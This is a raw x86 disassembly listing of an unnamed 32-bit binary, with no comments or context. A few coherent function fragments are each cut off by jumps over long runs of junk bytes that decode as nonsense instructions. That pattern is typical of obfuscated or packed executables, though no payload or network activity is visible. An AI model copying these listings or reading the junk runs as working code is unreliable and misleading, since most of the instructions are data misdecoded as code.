  40548d:	enter  0x8006,0xb
  405491:	inc    edx
  405492:	lea    ebx,[ebx-0x27]
  405495:	mov    dl,0x23
  405497:	sub    dh,BYTE PTR [eax]
  405499:	sub    eax,0x2a6031e5
  40549e:	sub    edi,DWORD PTR [esp+edi*2+0x62]
  4054a2:	jl     0x405520
  4054a4:	jl     0x4054e5
  4054a6:	loop   0x405454
  4054a8:	add    eax,0xf3ef0558
  4054ad:	mov    cl,0x7a
  4054af:	ret    0x1f9e
  4054b2:	xor    BYTE PTR [edi],0x94
  4054b5:	dec    eax
  4054b6:	xchg   ecx,eax
  4054b7:	dec    edi
  4054b8:	ret    
  4054b9:	outs   dx,BYTE PTR ds:[esi]
  4054ba:	out    dx,al
  4054bb:	mov    bh,BYTE PTR ds:0xacf9f66b
  4054c1:	out    dx,eax
  4054c2:	cmp    dh,BYTE PTR [ebp-0x3f0515b8]
  4054c8:	pop    ebp
  4054c9:	pop    ecx
  4054ca:	mov    al,0xce
  4054cc:	arpl   WORD PTR ds:0x659c6e64,ax
  4054d2:	fcom   DWORD PTR [ebp-0x38b8ea73]
  4054d8:	fidiv  DWORD PTR [ecx+ebx*1]
  4054db:	icebp  
  4054dc:	add    ebx,DWORD PTR [edx-0x43]
  4054df:	js     0x40550c
  4054e1:	xor    edx,esp
  4054e3:	xor    BYTE PTR [edx+0x58],0x44
  4054e7:	adc    BYTE PTR [ebx-0x61ec8889],cl
  4054ed:	xchg   DWORD PTR [ecx+ecx*2-0x298e4512],ecx
  4054f4:	stc    
  4054f5:	ficom  WORD PTR [ebp+esi*1+0x8120a2a]
  4054fc:	mov    al,ds:0xf960a455
  405501:	jns    0x4054e1
  405503:	mov    edx,0x596e0f28
  405508:	cmp    al,bl
  40550a:	adc    BYTE PTR [edx+0x6f],ch
  40550d:	idiv   dl
  40550f:	push   ecx
  405510:	ja     0x405541
  405512:	pop    es
  405513:	das    
  405514:	add    al,0x8d
  405516:	dec    edi
  405517:	cmp    eax,0x4e05313
  40551c:	cmp    bl,BYTE PTR [edx-0x2b]
  40551f:	push   edx
  405520:	add    BYTE PTR [esi+esi*2],bl
  405523:	and    eax,0x8d21a65b
  405528:	push   esp
  405529:	test   eax,0x81cb9e5b
  40552e:	cmp    DWORD PTR [ebx+0x73],esi
  405531:	mov    bl,0xb7
  405533:	jge    0x405591
  405535:	push   esp
  405536:	jmp    0x4055aa
  405538:	dec    edi
  405539:	add    cl,bl
  40553b:	cmp    eax,0xc39635
  405540:	outs   dx,BYTE PTR ds:[esi]
  405541:	jle    0x405544
  405543:	leave  
  405544:	xchg   ebx,eax
  405545:	pop    ds
  405546:	cmp    bl,dl
  405548:	jnp    0x4054d1
  40554a:	mov    ds,eax
  40554c:	retf   0xba63
  40554f:	cmp    DWORD PTR [edi+ecx*8+0x22de15b2],ebx
  405556:	arpl   WORD PTR [esi+ecx*4],cx
  405559:	cmp    esi,DWORD PTR [ebx]
  40555b:	push   ds
  40555c:	xor    eax,0x6e63b4f4
  405561:	adc    ebx,DWORD PTR [edi]
  405563:	push   ss
  405564:	push   esi
  405565:	inc    ecx
  405566:	fisub  DWORD PTR [esi]
  405568:	and    dh,BYTE PTR [ecx-0x2e]
  40556b:	das    
  40556c:	dec    edx
  40556d:	mov    edx,0x7b8d0a67
  405572:	jnp    0x4055db
  405574:	xchg   edx,eax
  405575:	pop    es
  405576:	sbb    BYTE PTR [esi-0x283327ac],cl
  40557c:	sbb    DWORD PTR [edx-0x29f49e1d],ebx
  405582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405583:	push   ds
  405584:	sub    al,0x26
  405586:	xor    BYTE PTR [esi+0x493757de],dl
  40558c:	popa   
  40558d:	push   0x768dfa99
  405592:	dec    eax
  405593:	xchg   ebp,eax
  405594:	(bad)  
  405595:	in     eax,dx
  405596:	xchg   cl,cl
  405598:	imul   ebx,DWORD PTR [edi-0x43],0x4d8bf1f7
  40559f:	adc    BYTE PTR [ebx],ah
  4055a1:	enter  0xc981,0x8f
  4055a5:	sbb    eax,0xc18b8116
  4055aa:	pop    ebp
  4055ab:	ret    0x18
  4055ae:	push   ebp
  4055af:	mov    ebp,esp
  4055b1:	push   ecx
  4055b2:	xor    edx,edx
  4055b4:	xor    edx,DWORD PTR ds:0x43c8ec
  4055ba:	xor    ecx,ecx
  4055bc:	or     ecx,DWORD PTR ds:0x4427d8
  4055c2:	sub    edx,ecx
  4055c4:	sub    edx,DWORD PTR [edx+ecx*1]
  4055c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4055ce:	movzx  eax,WORD PTR ds:0x44537c
  4055d5:	adc    DWORD PTR ds:0x413402,eax
  4055db:	jmp    0x405714
  4055e0:	ins    DWORD PTR es:[edi],dx
  4055e1:	je     0x40559f
  4055e3:	xchg   DWORD PTR [ebp+0x47],edx
  4055e6:	jge    0x4055e2
  4055e8:	fs pop ebp
  4055ea:	mov    eax,0x8d5cae77
  4055ef:	in     eax,dx
  4055f0:	adc    BYTE PTR [edx],ch
  4055f2:	jl     0x405670
  4055f4:	sbb    BYTE PTR [edi+0x7c],bh
  4055f7:	jl     0x40559c
  4055f9:	xor    edi,esp
  4055fb:	aam    0x84
  4055fd:	mov    al,ds:0xffd9fbb2
  405602:	inc    ebx
  405603:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405604:	aas    
  405605:	mov    ds:0x6e6fd5ae,eax
  40560a:	cmp    eax,0xd66ebd5d
  40560f:	xchg   edi,eax
  405610:	(bad)  
  405611:	jne    0x405691
  405613:	(bad)  
  405615:	add    BYTE PTR [esi-0xa804af0],ch
  40561b:	jnp    0x405648
  40561d:	xchg   ecx,eax
  40561e:	adc    eax,0x302edf74
  405623:	imul   eax,DWORD PTR [esi+ebp*1+0x73],0xffffffe9
  405628:	mov    eax,ds:0x37ac8a0d
  40562d:	pop    eax
  40562e:	sbb    DWORD PTR [ebx],edx
  405630:	push   esi
  405631:	fnsetpm(287 only) 
  405633:	sbb    al,0xfd
  405635:	push   ds
  405636:	or     bl,BYTE PTR [ebx+edi*8+0x17]
  40563a:	xor    BYTE PTR [esi-0x65],0x9a
  40563e:	xchg   dh,dh
  405640:	inc    ebp
  405641:	add    eax,0x47593c62
  405646:	sbb    al,0xb1
  405648:	sub    dl,BYTE PTR [ebx+0x38584245]
  40564e:	jmp    0x60c0517d
  405653:	pop    es
  405654:	dec    ecx
  405655:	das    
  405656:	cdq    
  405657:	mov    ebx,0xb4f0af57
  40565c:	scas   al,BYTE PTR es:[edi]
  40565d:	and    esi,ebx
  40565f:	fisttp DWORD PTR [ebx]
  405661:	jnp    0x4056a6
  405663:	jmp    0x4790a688
  405668:	xchg   edx,eax
  405669:	jge    0x4056c6
  40566b:	arpl   sp,bp
  40566d:	mov    dl,0xd2
  40566f:	cmp    al,0xf3
  405671:	in     al,dx
  405672:	push   ss
  405673:	push   ds
  405674:	stos   BYTE PTR es:[edi],al
  405675:	fwait
  405676:	jb     0x4056b0
  405678:	push   eax
  405679:	mov    cl,0xe6
  40567b:	sub    BYTE PTR [ecx],cl
  40567d:	dec    edx
  40567e:	dec    edi
  40567f:	rol    ecx,cl
  405681:	xor    esi,DWORD PTR [esi]
  405683:	std    
  405684:	and    BYTE PTR [eiz*1-0x7af43457],dl
  40568b:	in     eax,0x63
  40568d:	or     eax,0xf1a39c5b
  405692:	xchg   esi,eax
  405693:	mov    ah,0xca
  405695:	jne    0x405686
  405697:	js     0x40563c
  405699:	hlt    
  40569a:	inc    ebx
  40569b:	xor    BYTE PTR [edi],dh
  40569d:	cwde   
  40569e:	ins    DWORD PTR es:[edi],dx
  40569f:	add    eax,DWORD PTR [esi-0x7d1cdbc0]
  4056a5:	daa    
  4056a6:	(bad)  
  4056a7:	sbb    BYTE PTR [ebx+0x4a],dl
  4056aa:	sbb    bl,bl
  4056ac:	lahf   
  4056ad:	jle    0x4056db
  4056af:	xchg   edi,eax
  4056b0:	ror    ebp,cl
  4056b2:	mov    esp,0x5e303042
  4056b7:	out    0xca,eax
  4056b9:	sub    esp,DWORD PTR [ebx-0x71]
  4056bc:	sub    eax,0x36ec8c7b
  4056c1:	dec    ecx
  4056c2:	xchg   edi,eax
  4056c3:	aad    0x43
  4056c5:	inc    esp
  4056c6:	dec    ebp
  4056c7:	outs   dx,DWORD PTR ds:[esi]
  4056c8:	test   eax,0xd6c29874
  4056cd:	test   BYTE PTR [edx],dl
  4056cf:	mov    al,0x5c
  4056d1:	sub    esp,edx
  4056d3:	and    DWORD PTR [edi],ebp
  4056d5:	xchg   edi,eax
  4056d6:	icebp  
  4056d7:	fild   QWORD PTR [edx-0x7bc0b983]
  4056dd:	ror    BYTE PTR [edi-0x73],cl
  4056e0:	mov    bh,0x55
  4056e2:	loopne 0x40568d
  4056e4:	sbb    BYTE PTR [eax-0x5a],cl
  4056e7:	fcom   DWORD PTR [ecx-0x64f100e6]
  4056ed:	outs   dx,DWORD PTR ds:[esi]
  4056ee:	cli    
  4056ef:	ss test eax,0xf3d51228
  4056f5:	js     0x4056f0
  4056f7:	mul    cl
  4056f9:	xor    al,0x9
  4056fb:	mov    esp,0x54a53dd6
  405700:	push   0x310d4e01
  405705:	dec    esi
  405706:	mov    WORD PTR [ecx+0x35d56fd0],ss
  40570c:	fnstcw WORD PTR [edi-0x49cd5e9e]
  405712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405714:	mov    eax,DWORD PTR [ebp-0x4]
  405717:	mov    edx,DWORD PTR [ebp+0x10]
  40571a:	or     ecx,0x2821
  405720:	mov    ecx,0x7510857
  405725:	not    DWORD PTR ds:0x41341e
  40572b:	jmp    0x405864
  405730:	xor    al,dh
  405732:	push   0x65
  405734:	jp     0x40579b
  405736:	fnstsw WORD PTR [ecx-0x7c]
  405739:	mov    ebp,0x5770b79
  40573e:	sub    DWORD PTR [esi+0x7c7c2d3c],edi
  405744:	sbb    BYTE PTR [edi+0x7c],bh
  405747:	jl     0x4056dd
  405749:	out    0x41,al
  40574b:	xor    dh,al
  40574d:	mov    edx,0x422a15be
  405752:	mov    dl,0x17
  405754:	and    DWORD PTR [ecx+0xa],0x68
  405758:	popf   
  405759:	adc    esi,DWORD PTR [esi+0x4a]
  40575c:	frstor [ebx+0x3f2f0b51]
  405762:	cmp    bl,BYTE PTR [ecx]
  405764:	pop    edi
  405765:	xchg   edx,eax
  405766:	jge    0x405796
  405768:	adc    eax,0x8b96c32b
  40576d:	shl    BYTE PTR [ecx],0xae
  405770:	stos   BYTE PTR es:[edi],al
  405771:	sub    al,0x63
  405773:	mov    dl,0x2f
  405775:	mov    WORD PTR [ecx],gs
  405777:	add    BYTE PTR [eax-0x63],ch
  40577a:	or     al,0x9c
  40577c:	addr16 ret 
  40577e:	and    eax,DWORD PTR [esi]
  405780:	pop    ds
  405781:	dec    ebx
  405782:	xor    bl,BYTE PTR [eax*4-0x48151ad9]
  405789:	cmp    BYTE PTR [edi-0x238b55b4],cl
  40578f:	dec    ebp
  405790:	cli    
  405791:	xchg   ecx,edx
  405793:	repz fimul WORD PTR [edi-0x48]
  405797:	and    al,0x13
  405799:	aaa    
  40579a:	jl     0x405746
  40579c:	ret    0xe6e4
  40579f:	mov    WORD PTR [eax+0x5d],gs
  4057a2:	sub    BYTE PTR [ebx],al
  4057a4:	mov    ss,WORD PTR [edx+ebx*4]
  4057a7:	adc    bl,0x47
  4057aa:	cmp    ebp,DWORD PTR [esp+edx*2-0x46]
  4057ae:	out    0x83,eax
  4057b0:	push   esi
  4057b1:	lods   al,BYTE PTR ds:[esi]
  4057b2:	push   edx
  4057b3:	and    BYTE PTR [edx+edx*2+0x4],ch
  4057b7:	add    al,0xb2
  4057b9:	or     ebp,DWORD PTR [eax]
  4057bb:	adc    BYTE PTR [esi+0x57a91d04],cl
  4057c1:	sahf   
  4057c2:	ja     0x4057b8
  4057c4:	or     bh,BYTE PTR [ecx+0x55]
  4057c7:	inc    esp
  4057c8:	rol    BYTE PTR [ebp+edx*4+0x60],0x45
  4057cd:	aam    0x6a
  4057cf:	and    bh,dl
  4057d1:	sub    ah,ah
  4057d3:	and    BYTE PTR [ecx+0x7f],0x7d
  4057d7:	shl    DWORD PTR [ebp+0x4e],0x59
  4057db:	out    0x9b,eax
  4057dd:	and    eax,0xd98e1832
  4057e2:	pop    ecx
  4057e3:	in     al,dx
  4057e4:	popa   
  4057e5:	loope  0x405865
  4057e7:	jno    0x4057a2
  4057e9:	fdivr  st,st(7)
  4057eb:	(bad)  
  4057ed:	mov    WORD PTR [edx-0x22b63616],?
  4057f3:	enter  0x17a2,0x85
  4057f7:	and    ebp,DWORD PTR [eax+0x13]
  4057fa:	adc    al,0x59
  4057fc:	adc    dl,BYTE PTR [ecx+0x7459c241]
  405802:	xor    BYTE PTR [edx],dh
  405804:	cld    
  405805:	adc    eax,0x70894425
  40580a:	jge    0x405845
  40580c:	jl     0x405839
  40580e:	mov    ds:0x44650f4c,eax
  405813:	in     al,dx
  405814:	int3   
  405815:	mov    eax,esp
  405817:	repz xor BYTE PTR [ebp+0x2b97ce03],ch
  40581e:	xchg   ebp,eax
  40581f:	mov    ch,0x17
  405821:	mov    al,BYTE PTR [edx]
  405823:	out    0xd2,eax
  405825:	mov    WORD PTR [edi-0x65d09b03],?
  40582b:	stos   DWORD PTR es:[edi],eax
  40582c:	mov    ds:0x57e15b2f,eax
  405831:	adc    BYTE PTR [edi-0x4882b673],0xf9
  405838:	iret   
  405839:	or     BYTE PTR [ecx-0x70673db9],ch
  40583f:	out    0xe1,eax
  405841:	mov    ds:0xf704f400,al
  405846:	shl    DWORD PTR [ebx+0x59],cl
  405849:	gs pop eax
  40584b:	repnz sub DWORD PTR [ebp+0x7253e5ac],ebp
  405852:	pop    ebp
  405853:	out    dx,eax
  405854:	test   BYTE PTR [ebx+ebx*4-0x7],al
  405858:	or     ebp,DWORD PTR [edx]
  40585a:	sbb    al,cl
  40585c:	mov    edi,0xef39d4ab
  405861:	cmp    eax,0xc1338b19
  405866:	add    eax,0x32729e
  40586b:	or     DWORD PTR ds:0x413416,0x43fbdc
  405875:	mov    DWORD PTR [edx],eax
  405877:	neg    edx
  405879:	mov    eax,DWORD PTR [ebp+0x14]
  40587c:	and    DWORD PTR ds:0x43fbec,0x0
  405886:	xor    edx,edx
  405888:	add    edx,DWORD PTR ds:0x43fbec
  40588e:	inc    edx
  40588f:	mov    DWORD PTR ds:0x43fbec,edx
  405895:	cmp    DWORD PTR ds:0x43fbec,0x14
  40589c:	jne    0x4058b0
  4058a2:	push   DWORD PTR [ebp-0x28]
  4058a5:	push   0x43fbfc
  4058aa:	call   DWORD PTR ds:0x43c840
  4058b0:	cmp    DWORD PTR ds:0x43fbec,0x13
  4058b7:	jb     0x405886
  4058bd:	mov    edx,DWORD PTR [ebp+0x10]
  4058c0:	mov    DWORD PTR [edx+0x4],eax
  4058c3:	mov    eax,DWORD PTR [ebp+0x18]
  4058c6:	mov    edx,DWORD PTR [ebp+0x10]
  4058c9:	mov    DWORD PTR [edx+0x8],eax
  4058cc:	mov    eax,DWORD PTR [ebp+0x1c]
  4058cf:	mov    edx,DWORD PTR [ebp+0x10]
  4058d2:	jmp    0x405a0b
  4058d7:	in     eax,0xab
  4058d9:	ins    DWORD PTR es:[edi],dx
  4058da:	push   es
  4058db:	jge    0x4058a3
  4058dd:	imul   edi,DWORD PTR gs:[ecx],0x49
  4058e1:	mov    al,ds:0xee1a63b9
  4058e6:	mov    al,bl
  4058e8:	sub    al,0x7c
  4058ea:	jl     0x405904
  4058ec:	jg     0x40596a
  4058ee:	jl     0x405878
  4058f0:	mov    ds:0x81a62f8f,eax
  4058f5:	fdiv   DWORD PTR [ecx+edi*8+0x5418e9d7]
  4058fc:	iret   
  4058fd:	mov    WORD PTR [esi+0xd],es
  405900:	sti    
  405901:	and    ebp,edi
  405903:	push   ebp
  405904:	repz and eax,0x9b612b4b
  40590a:	add    eax,0x42ae61f0
  40590f:	(bad)  
  405910:	jp     0x405986
  405912:	and    esp,DWORD PTR [ebp-0x48280adf]
  405918:	jne    0x405998
  40591a:	add    BYTE PTR [eax+0x28bea5ef],dl
  405920:	mov    esi,esi
  405922:	push   es
  405923:	and    bl,BYTE PTR [ecx]
  405925:	pop    eax
  405926:	and    BYTE PTR [esi-0x2b],bl
  405929:	add    al,0xc2
  40592b:	out    dx,eax
  40592c:	xor    eax,0xf62e8503
  405931:	pop    eax
  405932:	mov    bl,0x96
  405934:	(bad)  
  405935:	lods   al,BYTE PTR ds:[esi]
  405936:	and    al,0xff
  405938:	mov    ebp,0x747adef0
  40593d:	fild   QWORD PTR [edi]
  40593f:	fst    st(5)
  405941:	adc    dl,BYTE PTR [ebp+0x12]
  405944:	ja     0x4058ed
  405946:	mov    dh,ah
  405948:	fwait
  405949:	lods   al,BYTE PTR ds:[esi]
  40594a:	test   BYTE PTR [ebx],dl
  40594c:	mov    edx,0x903ef253
  405951:	in     eax,0x9b
  405953:	pusha  
  405954:	test   DWORD PTR [esi+ecx*1-0x128ec2cd],ebp
  40595b:	cmp    al,0xfa
  40595d:	pop    esi
  40595e:	jo     0x405944
  405960:	inc    edi
  405961:	add    edi,DWORD PTR [edx]
  405963:	dec    edx
  405964:	shl    dh,1
  405966:	inc    ebp
  405967:	sub    esi,DWORD PTR [edx-0x46e1944a]
  40596d:	push   cs
  40596e:	add    al,0x3e
  405970:	mov    edx,0x375b7fe0
  405975:	fidiv  WORD PTR [ebx]
  405977:	dec    ebx
  405978:	xor    ebp,DWORD PTR [edi]
  40597a:	cld    
  40597b:	jb     0x405921
  40597d:	mov    dh,0x73
  40597f:	and    dh,dl
  405981:	call   0xa094:0x3aa6ad85
  405988:	mov    bh,0x12
  40598a:	pop    edx
  40598b:	push   ss
  40598c:	mov    bl,0xb0
  40598e:	shl    BYTE PTR [ebx-0x54],cl
  405991:	add    edi,DWORD PTR [edx+ebp*1+0x218bd198]
  405998:	pop    eax
  405999:	cmp    BYTE PTR [ecx+0x0],dl
  40599c:	and    al,0x96
  40599e:	xchg   esi,eax
  40599f:	call   0xee02:0x7c8cd732
  4059a6:	jge    0x405937
  4059a8:	in     al,dx
  4059a9:	dec    ebx
  4059aa:	xchg   ebp,eax
  4059ab:	adc    BYTE PTR [ebx-0x13],dl
  4059ae:	repz sub BYTE PTR [edi-0x59],0xfa
  4059b3:	fwait
  4059b4:	in     al,dx
  4059b5:	cmp    eax,0xeedf3e0c
  4059ba:	ror    DWORD PTR [esi-0x29a46882],1
  4059c0:	and    BYTE PTR [ecx-0x5c],0x0
  4059c4:	outs   dx,BYTE PTR ds:[esi]
  4059c5:	outs   dx,DWORD PTR ds:[esi]
  4059c6:	push   esi
  4059c7:	push   0xffffffcf
  4059c9:	aas    
  4059ca:	push   esi
  4059cb:	pop    esp
  4059cc:	xchg   ebx,eax
  4059cd:	sub    DWORD PTR [ecx+0x3a],eax
  4059d0:	pop    edx
  4059d1:	pushf  
  4059d2:	mov    esi,0x2ba4d407
  4059d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059d8:	pop    es
  4059d9:	adc    bl,0xd1
  4059dc:	test   BYTE PTR [esi],ch
  4059de:	lods   al,BYTE PTR ds:[esi]
  4059df:	xchg   ebp,eax
  4059e0:	inc    ecx
  4059e1:	jb     0x405a09
  4059e3:	dec    ecx
  4059e4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4059e6:	dec    ecx
  4059e7:	xor    DWORD PTR [edx],eax
  4059e9:	mov    ebx,0xa2f66e45
  4059ee:	mov    bl,0x27
  4059f0:	sbb    BYTE PTR [eax-0x50],ch
  4059f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059f4:	sub    dl,BYTE PTR [ebx-0x53ac574f]
  4059fa:	mov    dh,0x5a
  4059fc:	sbb    eax,DWORD PTR [eax-0x57]
  4059ff:	inc    edi
  405a00:	cmp    ch,ch
  405a02:	ds dec eax
  405a04:	jp     0x405a1a
  405a06:	xchg   edi,eax
  405a07:	je     0x4059f1
  405a09:	ror    BYTE PTR es:[ecx+0x458b0c42],0x20
  405a11:	mov    edx,DWORD PTR [ebp+0x10]
  405a14:	mov    DWORD PTR [edx+0x10],eax
  405a17:	mov    eax,eax
  405a19:	mov    eax,DWORD PTR [ebp+0x14]
  405a1c:	test   eax,eax
  405a1e:	jmp    0x405b57
  405a23:	pop    edx
  405a24:	loope  0x405a4a
  405a26:	sbb    bh,BYTE PTR [ebx+0x5f617add]
  405a2c:	retf   
  405a2d:	mov    cl,0x6b
  405a2f:	sti    
  405a30:	push   es
  405a31:	ret    
  405a32:	int    0xe4
  405a34:	das    
  405a35:	jl     0x405ab3
  405a37:	sbb    BYTE PTR [edi+0x7c],bh
  405a3a:	jl     0x4059e3
  405a3c:	bound  esi,QWORD PTR [esi+0x72]
  405a3f:	adc    eax,0xffffffb3
  405a42:	or     BYTE PTR [ebp-0x4d],al
  405a45:	or     esp,DWORD PTR [ebx*1+0x6d8d9450]
  405a4c:	retf   
  405a4d:	mov    al,0xee
  405a4f:	fwait
  405a50:	mov    BYTE PTR [esp+esi*4+0x5c],dh
  405a54:	pop    ecx
  405a55:	test   BYTE PTR [edx+0x117fdbe8],bl
  405a5b:	test   DWORD PTR [ecx+edi*1],ebx
  405a5e:	push   esp
  405a5f:	out    dx,al
  405a60:	imul   edi,esi,0xc66ea911
  405a66:	push   esp
  405a67:	xchg   ebx,eax
  405a68:	hlt    
  405a69:	cli    
  405a6a:	or     eax,0x9e8ae07c
  405a6f:	jg     0x405a97
  405a71:	scas   al,BYTE PTR es:[edi]
  405a72:	dec    ecx
  405a73:	stos   BYTE PTR es:[edi],al
  405a74:	lods   eax,DWORD PTR ds:[esi]
  405a75:	int    0x10
  405a77:	inc    ebx
  405a78:	int    0x7f
  405a7a:	js     0x405aa3
  405a7c:	rcr    BYTE PTR [eax+edx*4-0x1a],cl
  405a80:	into   
  405a81:	pop    ebx
  405a82:	leave  
  405a83:	stc    
  405a84:	push   edi
  405a85:	xchg   BYTE PTR [edi+ecx*8-0x17c70a47],ch
  405a8c:	sub    bl,BYTE PTR [esi-0xe]
  405a8f:	daa    
  405a90:	js     0x405b02
  405a92:	icebp  
  405a93:	ins    BYTE PTR es:[edi],dx
  405a94:	xchg   esp,eax
  405a95:	mov    esp,0x8479907
  405a9a:	aas    
  405a9b:	stos   DWORD PTR es:[edi],eax
  405a9c:	ins    BYTE PTR es:[edi],dx
  405a9d:	sbb    eax,0xd6c4b552
  405aa2:	add    bl,BYTE PTR [ebx+0x4c]
  405aa5:	jbe    0x405a6b
  405aa7:	and    ch,0x0
  405aaa:	aam    0x59
  405aac:	pop    ebp
  405aad:	adc    eax,0xa5bec8dd
  405ab2:	jae    0x405ac7
  405ab4:	cmp    eax,0xdf9c8970
  405ab9:	or     DWORD PTR [esi],ebp
  405abb:	in     eax,0x7d
  405abd:	rol    BYTE PTR [edi+ebx*1],0x6f
  405ac1:	adc    esp,DWORD PTR [esi]
  405ac3:	and    dh,BYTE PTR [ebp-0x37618303]
  405ac9:	imul   esi,eax,0xffffff80
  405acc:	test   esp,edx
  405ace:	push   edi
  405acf:	retf   
  405ad0:	and    ecx,DWORD PTR [esi+0x30270550]
  405ad6:	or     dl,BYTE PTR [ecx+0x31]
  405ad9:	cmp    esi,DWORD PTR [ebp+ecx*2-0x2d]
  405add:	sbb    ah,BYTE PTR [ebp+0x3cc7383a]
  405ae3:	mul    DWORD PTR [ebp-0x39]
  405ae6:	jnp    0x405aaa
  405ae8:	test   BYTE PTR [eax-0x3f],ah
  405aeb:	sub    al,0xa8
  405aed:	cdq    
  405aee:	sub    ecx,DWORD PTR [esi]
  405af0:	shl    DWORD PTR [edx+0x5fb23886],cl
  405af6:	scas   eax,DWORD PTR es:[edi]
  405af7:	mov    edi,0x216b1fb4
  405afc:	ss mov ah,0x81
  405aff:	inc    eax
  405b00:	fisttp WORD PTR [esp+edi*4+0x78]
  405b04:	sbb    eax,0x3159b476
  405b09:	jle    0x405afc
  405b0b:	es ret 
  405b0d:	mov    eax,es:0x8aa3124a
  405b13:	ret    0xd19f
  405b16:	cwde   
  405b17:	loopne 0x405b7a
  405b19:	jle    0x405b08
  405b1b:	dec    edx
  405b1c:	add    edi,DWORD PTR [ebx+0x29]
  405b1f:	dec    ecx
  405b20:	cwde   
  405b21:	lahf   
  405b22:	inc    edx
  405b23:	es sbb eax,0xe35fe49b
  405b29:	rcl    edi,0x64
  405b2c:	inc    edi
  405b2d:	jl     0x405ba6
  405b2f:	xchg   ebx,eax
  405b30:	or     eax,0xb9da1450
  405b35:	lock and ebp,DWORD PTR [ecx+0x4f]
  405b39:	pop    eax
  405b3a:	dec    esi
  405b3b:	mov    eax,0x4bd07b2c
  405b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b41:	push   edi
  405b42:	jle    0x405b7f
  405b44:	mov    ch,0xa0
  405b46:	pop    ebx
  405b47:	mov    al,ds:0x5dce90ed
  405b4c:	dec    ecx
  405b4d:	push   ebp
  405b4e:	xor    eax,0xbfa9b22e
  405b53:	outs   dx,BYTE PTR ds:[esi]
  405b54:	rcl    ch,1
  405b56:	ror    BYTE PTR [ebx-0x7af0f7bb],0x3
  405b5d:	add    BYTE PTR [eax],al
  405b5f:	add    BYTE PTR [ebx-0x3eccf3bb],cl
  405b65:	add    eax,0x32729e
  405b6a:	leave  
  405b6b:	ret    0x1c
  405b6e:	push   ebp
  405b6f:	mov    ebp,esp
  405b71:	sub    esp,0x78
  405b74:	adc    DWORD PTR ds:0x43fbe0,0x7d94
  405b7e:	jmp    0x405caa
  405b83:	or     esp,ebx
  405b85:	dec    ecx
  405b86:	or     BYTE PTR [ecx-0x53],ch
  405b89:	dec    ebp
  405b8a:	aad    0x48
  405b8c:	aas    
  405b8d:	adc    esi,esp
  405b8f:	outs   dx,DWORD PTR ds:[esi]
  405b90:	xor    DWORD PTR [ebx],esp
  405b92:	stc    
  405b93:	sub    BYTE PTR [esi],0x7c
  405b96:	jl     0x405ba5
  405b98:	jg     0x405c16
  405b9a:	jl     0x405b96
  405b9c:	leave  
  405b9d:	xor    ch,bl
  405b9f:	xchg   edx,eax
  405ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba1:	add    eax,0xf7183996
  405ba6:	int3   
  405ba7:	mov    ah,0x6d
  405ba9:	retf   
  405baa:	bound  eax,QWORD PTR [esi]
  405bac:	xlat   BYTE PTR ds:[ebx]
  405bad:	dec    eax
  405bae:	or     esp,DWORD PTR [edi-0x62]
  405bb1:	imul   esp,DWORD PTR [ebx-0x35b12c61],0xffffff8b
  405bb8:	test   DWORD PTR [edx+0x71],0x3416d31f
  405bbf:	scas   al,BYTE PTR es:[edi]
  405bc0:	retf   0x31ab
  405bc3:	xor    al,0x12
  405bc5:	or     eax,0xc07400ec
  405bca:	imul   edi,DWORD PTR [esi-0x6b],0x24cb5218
  405bd1:	jb     0x405bd4
  405bd3:	repz mov dl,0xa8
  405bd6:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  405bd8:	or     edi,eax
  405bda:	leave  
  405bdb:	xor    ecx,DWORD PTR [edx+0x7e4631fd]
  405be1:	or     eax,0x7ceaefed
  405be6:	xchg   ebp,eax
  405be7:	sbb    al,0xed
  405be9:	mov    edi,0x50cf05f6
  405bee:	adc    DWORD PTR [ecx+0xe],ecx
  405bf1:	stc    
  405bf2:	push   ebx
  405bf3:	mov    esp,0xb2223266
  405bf8:	pop    ebx
  405bf9:	sahf   
  405bfa:	ins    DWORD PTR es:[edi],dx
  405bfb:	scas   al,BYTE PTR es:[edi]
  405bfc:	mov    ebp,0x1ec22e4c
  405c01:	inc    ebx
  405c02:	sub    cl,BYTE PTR [ecx+0x62bd4fc6]
  405c08:	(bad)  [ecx*2-0x345e7ad]
  405c0f:	inc    ebp
  405c10:	pop    ecx
  405c11:	pop    ss
  405c12:	cs xor eax,0xfa1a019a
  405c18:	dec    ebp
  405c19:	and    al,0x23
  405c1b:	jno    0x405bdb
  405c1d:	sbb    al,dh
  405c1f:	xchg   ebx,eax
  405c20:	mov    BYTE PTR [ecx-0x249b93b8],dl
  405c26:	pop    esp
  405c27:	lods   eax,DWORD PTR ds:[esi]
  405c28:	cdq    
  405c29:	repz inc esi
  405c2b:	dec    edx
  405c2c:	jmp    FWORD PTR [ebx-0x5b]
  405c2f:	out    0xbf,eax
  405c31:	xor    DWORD PTR [esi-0x5a],edi
  405c34:	dec    esi
  405c35:	xor    edx,esi
  405c37:	out    dx,eax
  405c38:	or     eax,0x76764d73
  405c3d:	int    0xa4
  405c3f:	rcr    DWORD PTR [edx+0x3f311d19],0xf2
  405c46:	add    al,0xd5
  405c48:	fild   WORD PTR [ebx]
  405c4a:	ret    0xc6d4
  405c4d:	cs call 0x43f325bb
  405c53:	mov    bh,0x6d
  405c55:	popf   
  405c56:	add    eax,DWORD PTR ds:[edx+0x5c]
  405c5a:	pop    DWORD PTR [ebx+0x5a4e321a]
  405c60:	sub    DWORD PTR [esi+0x4e],ecx
  405c63:	aaa    
  405c64:	mov    ch,0x64
  405c66:	mov    dl,0xbc
  405c68:	fst    QWORD PTR [edi]
  405c6a:	repnz adc bl,BYTE PTR [eax+0x2574412f]
  405c71:	nop
  405c72:	into   
  405c73:	cli    
  405c74:	aad    0xa9
  405c76:	loope  0x405cc1
  405c78:	outs   dx,DWORD PTR ds:[esi]
  405c79:	push   ebx
  405c7a:	cld    
  405c7b:	push   0xffffff98
  405c7d:	sbb    eax,DWORD PTR [eax-0xee6f851]
  405c83:	mov    es,esi
  405c85:	ja     0x405cb1
